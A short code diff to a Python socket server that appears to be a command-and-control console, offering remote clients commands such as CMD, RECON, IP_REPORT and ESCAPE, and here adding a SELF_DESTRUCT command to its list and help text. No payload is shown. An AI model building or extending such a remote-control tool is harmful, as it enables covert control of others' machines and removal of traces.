@@ -7,7 +7,7 @@ import threading
 host = '0.0.0.0'  # Open to anyone on the same wifi
 port = 8888
 
-types = ['HELO', 'EXIT', 'READ', 'RITE', 'CMD', 'ERR', 'RECON', 'IP_REPORT', 'ESCAPE']
+types = ['HELO', 'EXIT', 'READ', 'RITE', 'CMD', 'ERR', 'RECON', 'IP_REPORT', 'ESCAPE', 'SELF_DESTRUCT']
 
 lock = threading.Lock()
 addresses = []
@@ -27,12 +27,13 @@ def list_connections():
 def show_help():
     print("Usage: <command> <connection_id> [params...]")
     print("Server commands (no ID): 'help', 'listconns'")
-    print("Client commands: HELO, EXIT, CMD <cmd>, RECON, IP_REPORT, ESCAPE")
+    print("Client commands: HELO, EXIT, CMD <cmd>, RECON, IP_REPORT, ESCAPE, SELF_DESTRUCT")
     print("Examples: HELO 0")
     print("          RECON 0")
     print("          ESCAPE 0")
     print("          IP_REPORT 0")
     print("          CMD 0 ls")
+    print("          SELF_DESTRUCT 0")
 
 # ----------------------------------------------------------------------
 # Command input thread
